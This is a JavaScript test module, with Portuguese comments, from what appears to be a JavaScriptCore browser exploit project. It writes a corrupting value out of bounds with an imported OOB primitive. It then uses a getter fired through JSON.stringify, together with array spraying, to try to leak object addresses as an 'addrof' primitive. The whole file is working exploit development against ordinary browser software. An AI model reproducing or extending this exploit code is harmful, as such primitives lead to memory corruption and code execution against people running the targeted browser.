// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForAddrOfAttempt";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, potential_leaks: [] };

const CORRUPTION_OFFSET = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

class CheckpointForAddrOf {
    constructor(id) {
        this.id_marker = `AddrOfAttemptCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "AddrOfAttempt_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        current_test_results = { success: false, message: "Getter chamado, tentando addrof especulativo.", error: null, potential_leaks: [] };

        try {
            const target_obj = { name: "LeakyTarget", value: 0xABCDEF00 };
            logS3(`DENTRO DO GETTER: target_obj criado: ${JSON.stringify(target_obj)}`, "info", FNAME_GETTER);

            // Spray arrays para tentar influenciar o layout ou encontrar sobreposição
            const array_spray_size = 32; // Quantidade de arrays no spray
            const holding_arrays = [];
            const numeric_reader_arrays = [];
            const float_fill_pattern = 1.23456789e100; // Um float_t distinto

            for (let i = 0; i < array_spray_size; i++) {
                // Colocar o objeto alvo em alguns dos arrays
                if (i === Math.floor(array_spray_size / 2) || i === Math.floor(array_spray_size / 2) + 1) {
                    holding_arrays.push([target_obj, `marker-${i}`]);
                } else {
                    holding_arrays.push([`filler-${i}-0`, `filler-${i}-1`]);
                }
                let fa = new Float64Array(8); // Pequeno, 8 doubles = 64 bytes
                for (let j = 0; j < fa.length; j++) fa[j] = float_fill_pattern;
                numeric_reader_arrays.push(fa);
            }
            logS3(`DENTRO DO GETTER: Spray de ${array_spray_size} holding_arrays e numeric_reader_arrays concluído.`, "info", FNAME_GETTER);

            // Tentar ler dos numeric_reader_arrays esperando encontrar um ponteiro
            let found_leak = false;
            for (let i = 0; i < numeric_reader_arrays.length; i++) {
                const fa = numeric_reader_arrays[i];
                for (let j = 0; j < fa.length; j++) {
                    const float_val = fa[j];
                    if (float_val !== float_fill_pattern) {
                        // Um valor diferente do padrão foi encontrado! Poderia ser um ponteiro?
                        // Converter float para representação de inteiro 64-bit (aproximado)
                        const temp_buf = new ArrayBuffer(8);
                        const temp_dv = new DataView(temp_buf);
                        temp_dv.setFloat64(0, float_val, true); // Assume little-endian
                        const low = temp_dv.getUint32(0, true);
                        const high = temp_dv.getUint32(4, true);
                        const potential_ptr = new AdvancedInt64(low, high);
                        
                        const leak_info = `POTENCIAL LEAK: numeric_reader_arrays[${i}][${j}] = ${float_val} (float) -> ${potential_ptr.toString(true)} (hex64)`;
                        logS3(leak_info, "leak", FNAME_GETTER);
                        current_test_results.potential_leaks.push({
                            array_index: i,
                            element_index: j,
                            float_value: float_val,
                            hex_value: potential_ptr.toString(true)
                        });
                        found_leak = true;
                    }
                }
            }

            if (found_leak) {
                current_test_results.success = true;
                current_test_results.message = "Potencial(is) vazamento(s) de endereço encontrado(s) no numeric_reader_array!";
            } else {
                current_test_results.message = "Nenhum vazamento de endereço óbvio encontrado nos numeric_reader_arrays após spray.";
            }

        } catch (e) {
            logS3(`DENTRO DO GETTER: ERRO durante tentativa de addrof: ${e.message}`, "error", FNAME_GETTER);
            current_test_results.error = String(e);
            current_test_results.message = `Erro no getter durante addrof: ${e.message}`;
        }
        return 0xBADF00D;
    }

    // toJSON é um método da instância ou protótipo para ser chamado por JSON.stringify
    toJSON() {
        const FNAME_toJSON = "CheckpointForAddrOf.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter para acionar lógica de teste...`, "info", FNAME_toJSON);
        // Acessar a propriedade com getter para acionar a lógica de teste
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_addrof_test: true };
    }
}


export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST = "executeAddrOfAttemptInGetter"; // Nome interno
    logS3(`--- Iniciando Teste de AddrOf Especulativo no Getter ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado.", error: null, potential_leaks: [] };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { /* ... erro ... */ return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Realizar a escrita OOB "gatilho"
        oob_write_absolute(CORRUPTION_OFFSET, CORRUPTION_VALUE, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET)} do oob_data completada.`, "info", FNAME_TEST);

        // 2. Criar o objeto CheckpointForAddrOf
        const checkpoint_obj_for_addrof = new CheckpointForAddrOf(1);
        logS3(`CheckpointForAddrOf objeto criado. ID: ${checkpoint_obj_for_addrof.id_marker}`, "info", FNAME_TEST);
        
        // Não é mais necessário poluir Object.prototype.toJSON, pois toJSON é um método de CheckpointForAddrOf

        // 3. Chamar JSON.stringify
        logS3(`Chamando JSON.stringify(checkpoint_obj_for_addrof)...`, "info", FNAME_TEST);
        let stringify_result = null;
        try {
            stringify_result = JSON.stringify(checkpoint_obj_for_addrof);
            logS3(`JSON.stringify completado. Resultado: ${stringify_result}`, "info", FNAME_TEST);
        } catch (e) {
            logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
            if (!getter_called_flag) {
                 current_test_results.message = `Erro em JSON.stringify antes do getter: ${e.message}`;
                 current_test_results.error = String(e);
            }
        }

    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError), potential_leaks: [] };
    } finally {
        // Nenhuma poluição global para limpar, apenas o estado do módulo
        logS3("Limpeza finalizada.", "info", "CleanupFinal");
    }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE ADDR_OF: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE ADDR_OF: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
        }
        if (current_test_results.potential_leaks && current_test_results.potential_leaks.length > 0) {
            logS3("Potenciais Endereços Vazados:", "leak", FNAME_TEST);
            current_test_results.potential_leaks.forEach(leak => {
                logS3(`  Array[${leak.array_index}][${leak.element_index}]: Float=${leak.float_value}, Hex64=${leak.hex_value}`, "leak", FNAME_TEST);
            });
        }
    } else {
        logS3("RESULTADO TESTE ADDR_OF: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }
    // logS3(`  Detalhes finais JSON: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    logS3(`--- Teste de AddrOf Especulativo Concluído ---`, "test", FNAME_TEST);
}
